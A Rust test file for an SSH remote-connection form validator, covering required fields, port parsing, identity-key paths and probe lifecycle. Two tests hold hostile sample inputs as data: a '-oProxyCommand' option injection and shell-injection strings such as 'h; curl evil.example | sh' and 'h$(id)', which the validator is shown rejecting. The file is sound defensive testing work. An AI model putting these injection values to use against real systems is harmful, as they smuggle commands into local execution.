use std::fs;

use tempfile::tempdir;

use super::*;

fn form(server: &str, port: &str, user: &str, identity: &str, path: &str) -> RemoteConnectionForm {
    RemoteConnectionForm {
        server: server.to_string(),
        port: port.to_string(),
        user: user.to_string(),
        identity: identity.to_string(),
        path: path.to_string(),
    }
}

/// Covers R2: the connection is only submittable once the fields that identify
/// it are filled in.
#[test]
fn submit_requires_server_user_and_path() {
    let complete = form("10.0.0.7", "22", "vinh", "", "/srv/app");
    assert!(validate(&complete, false).can_submit());

    for incomplete in [
        form("", "22", "vinh", "", "/srv/app"),
        form("10.0.0.7", "22", "", "", "/srv/app"),
        form("10.0.0.7", "22", "vinh", "", ""),
    ] {
        assert!(
            !validate(&incomplete, false).can_submit(),
            "expected {incomplete:?} to be unsubmittable"
        );
    }
}

/// Covers R2: a blank port means the SSH default; anything non-numeric is an
/// error rather than a silently ignored field.
#[test]
fn blank_port_defaults_to_22_and_non_numeric_is_rejected() {
    let blank = validate(&form("h", "", "u", "", "/srv"), false);
    assert_eq!(blank.port_number, 22);
    assert_eq!(blank.port_error, None);
    assert!(blank.can_submit());

    let custom = validate(&form("h", "2222", "u", "", "/srv"), false);
    assert_eq!(custom.port_number, 2222);
    assert!(custom.can_submit());

    // Whitespace around a pasted value is trimmed, like every other field.
    let padded = validate(&form("h", " 2222 ", "u", "", "/srv"), false);
    assert_eq!(padded.port_number, 2222);
    assert!(padded.can_submit());

    for bad in ["abc", "0", "70000", "-1"] {
        let result = validate(&form("h", bad, "u", "", "/srv"), false);
        assert!(
            result.port_error.is_some(),
            "expected port {bad:?} to be rejected"
        );
        assert!(!result.can_submit());
    }
}

/// The identity is a *local* private key consumed by `ssh -i`, so its `~`
/// resolves on this machine — only the remote path's `~` resolves on the host.
///
/// The existence check lives in `check_identity_missing` rather than `validate`
/// because it touches the filesystem and `validate` runs on the render path.
#[test]
fn identity_path_expands_home_and_must_exist() {
    let home = tempdir().expect("tempdir");
    let key_dir = home.path().join(".ssh");
    fs::create_dir(&key_dir).expect("create .ssh");
    let key = key_dir.join("id_ed25519");
    fs::write(&key, "key").expect("write key");

    assert_eq!(
        expand_local_identity_path("~/.ssh/id_ed25519", Some(home.path())),
        key
    );

    let present = Some(home.path());
    assert!(!check_identity_missing("~/.ssh/id_ed25519", present));
    assert!(!check_identity_missing(&key.to_string_lossy(), present));
    assert!(check_identity_missing("~/.ssh/nope", present));
    // Optional: an SSH agent may already hold the key.
    assert!(!check_identity_missing("", present));
    assert!(!check_identity_missing("   ", present));

    let tilde = validate(&form("h", "22", "u", "~/.ssh/id_ed25519", "/srv"), false);
    assert_eq!(tilde.identity_error, None);
    assert!(tilde.can_submit());

    let missing = validate(&form("h", "22", "u", "~/.ssh/nope", "/srv"), true);
    assert!(missing.identity_error.is_some());
    assert!(!missing.can_submit());

    // A blank identity cannot be "missing" even if the caller says so: the
    // field is optional, so there is nothing to have lost.
    let empty = validate(&form("h", "22", "u", "", "/srv"), true);
    assert_eq!(empty.identity_error, None);
    assert!(empty.can_submit());
}

/// `validate` performs no filesystem access at all, which is what makes it safe
/// on the render path.
///
/// It used to call `.exists()` on the identity, so an identity under a stalled
/// network mount blocked the UI thread on every keystroke. Proven by deleting
/// the file the identity points at and showing the answer does not change:
/// `validate` cannot be consulting the disk, because the disk now disagrees
/// with it.
#[test]
fn validate_never_touches_the_filesystem() {
    let home = tempdir().expect("tempdir");
    let key_dir = home.path().join(".ssh");
    fs::create_dir(&key_dir).expect("create .ssh");
    let key = key_dir.join("id_ed25519");
    fs::write(&key, "key").expect("write key");
    let identity = key.to_string_lossy().into_owned();
    let filled = form("h", "22", "u", &identity, "/srv");

    assert!(!check_identity_missing(&identity, Some(home.path())));
    let before = validate(&filled, false);

    fs::remove_file(&key).expect("remove key");

    assert!(check_identity_missing(&identity, Some(home.path())));
    assert_eq!(
        validate(&filled, false),
        before,
        "validate must answer from its argument, not from the filesystem"
    );
    // And it reports the error when told to, so the check is not simply gone.
    assert!(validate(&filled, true).identity_error.is_some());
}

/// KTD10: a server or user starting with `-` would reach `ssh` as an option
/// (`-oProxyCommand=…`), which `BatchMode` does not stop. The `--` fence covers
/// the destination, and this covers the field before it ever gets there.
#[test]
fn leading_dash_in_server_or_user_is_rejected() {
    let bad_server = validate(
        &form("-oProxyCommand=touch /tmp/x", "22", "u", "", "/srv"),
        false,
    );
    assert!(bad_server.server_error.is_some());
    assert!(!bad_server.can_submit());

    let bad_user = validate(&form("h", "22", "-oProxyCommand=x", "", "/srv"), false);
    assert!(bad_user.user_error.is_some());
    assert!(!bad_user.can_submit());
}

/// KTD10: `remote_ssh_command` is typed into the *local* shell, so a
/// metacharacter in the server or user field is local command execution. The
/// command builder quotes both, and this rejects the payload one step earlier
/// where the user can still see which field is wrong.
#[test]
fn shell_metacharacters_in_server_or_user_are_rejected() {
    for server in [
        "h; curl evil.example | sh",
        "h`id`",
        "h$(id)",
        "h&&id",
        "h\nid",
        "h 10.0.0.1",
        "h'x",
    ] {
        let validation = validate(&form(server, "22", "u", "", "/srv"), false);
        assert!(
            validation.server_error.is_some(),
            "server {server:?} should be rejected"
        );
        assert!(!validation.can_submit());
    }

    for user in ["v; id", "v`id`", "v$(id)", "v u", "v'x"] {
        let validation = validate(&form("h", "22", user, "", "/srv"), false);
        assert!(
            validation.user_error.is_some(),
            "user {user:?} should be rejected"
        );
        assert!(!validation.can_submit());
    }
}

/// The allowlist has to clear real connections: DNS names, IPv4, IPv6 (bare and
/// bracketed, with a zone id), `DOMAIN\user`, and a machine account's `$`.
#[test]
fn ordinary_hosts_and_users_pass_the_charset_check() {
    for (server, user) in [
        ("build-01.eng.example.com", "vinh"),
        ("10.0.0.7", "deploy_bot"),
        ("::1", "ci.runner"),
        ("[fe80::1%en0]", "web-01"),
        ("localhost", "CORP\\vinh"),
        ("host_name", "svc$"),
    ] {
        let validation = validate(&form(server, "22", user, "", "/srv"), false);
        assert_eq!(
            validation.server_error, None,
            "server {server:?} should be accepted"
        );
        assert_eq!(
            validation.user_error, None,
            "user {user:?} should be accepted"
        );
        assert!(validation.can_submit());
    }
}

/// Covers R7: the form stays open across the probe and comes back with the
/// reason, and a probe result that lands after the user cancelled is dropped
/// rather than resurrecting a torn-down form.
#[test]
fn probe_lifecycle_guards_against_a_late_resolve() {
    let mut lifecycle = RemoteConnectionLifecycle::default();
    assert_eq!(lifecycle.state(), &RemoteConnectionModalState::Editing);

    let token = lifecycle.begin_probe();
    assert_eq!(lifecycle.state(), &RemoteConnectionModalState::Probing);

    // A stale result (from a probe the user already walked away from) is a
    // no-op, and does not knock the live probe out of its state.
    assert!(!lifecycle.fail(token - 1, "stale".to_string()));
    assert_eq!(lifecycle.state(), &RemoteConnectionModalState::Probing);

    assert!(lifecycle.fail(token, "unreachable".to_string()));
    assert_eq!(
        lifecycle.state(),
        &RemoteConnectionModalState::Failed("unreachable".to_string())
    );

    // Cancelling (or reopening) invalidates any probe still in flight.
    let second = lifecycle.begin_probe();
    lifecycle.reset();
    assert_eq!(lifecycle.state(), &RemoteConnectionModalState::Editing);
    assert!(!lifecycle.fail(second, "too late".to_string()));
    assert_eq!(lifecycle.state(), &RemoteConnectionModalState::Editing);
}

/// A probe is only startable from a clean form: while one is in flight the
/// submit path is closed, so a double-click cannot spawn two connections.
#[test]
fn submit_is_closed_while_a_probe_is_in_flight() {
    let mut lifecycle = RemoteConnectionLifecycle::default();
    assert!(lifecycle.can_start_probe());
    let token = lifecycle.begin_probe();
    assert!(!lifecycle.can_start_probe());
    lifecycle.fail(token, "unreachable".to_string());
    assert!(lifecycle.can_start_probe());
}
